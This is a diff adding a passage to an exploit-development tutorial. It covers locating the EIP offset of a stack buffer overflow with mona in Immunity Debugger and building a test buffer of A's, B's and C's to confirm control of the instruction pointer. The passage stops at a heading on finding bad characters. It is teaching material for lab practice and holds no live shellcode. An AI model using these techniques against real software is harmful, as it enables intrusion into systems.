@@ -190,3 +190,38 @@ padding = ""
 payload = ""
 postfix = "" 
 ```
+
+With the pattern loaded into the buffer, use mona from within immunity to find the offset of EIP. For the example below the length value is 600.  
+    
+```
+!mona findmsp -distance 600
+...
+[+] Looking for cyclic pattern in memory
+Cyclic pattern (normal) found at 0x005f3614 (length 600 bytes)
+Cyclic pattern (normal) found at 0x005f4a40 (length 600 bytes)
+Cyclic pattern (normal) found at 0x017df764 (length 600 bytes)
+EIP contains normal pattern : 0x78413778 (offset 112)
+ESP (0x017dfa30) points at offset 116 in normal pattern (length 484)
+EAX (0x017df764) points at offset 0 in normal pattern (length 600)
+EBP contains normal pattern : 0x41367841 (offset 108)
+... 
+```
+    Note the EIP offset (112) and any other registers that point to the pattern, noting their offsets as well. It seems like the ESP register points to the last 484 bytes of the pattern, which is enough space for our shellcode.
+
+Create a new buffer using this information to ensure that we can control EIP:
+    
+```python
+prefix = ""
+offset = 112
+overflow = "A" * offset
+retn = "BBBB"
+padding = ""
+payload = "C" * (600-112-4)
+postfix = ""
+
+buffer = prefix + overflow + retn + padding + payload + postfix 
+```
+ Crash the application using this buffer, and make sure that EIP is overwritten by B's (`\x42`) and that the ESP register points to the start of the C's (`\x43`).
+    
+## Finding Bad Characters
+    
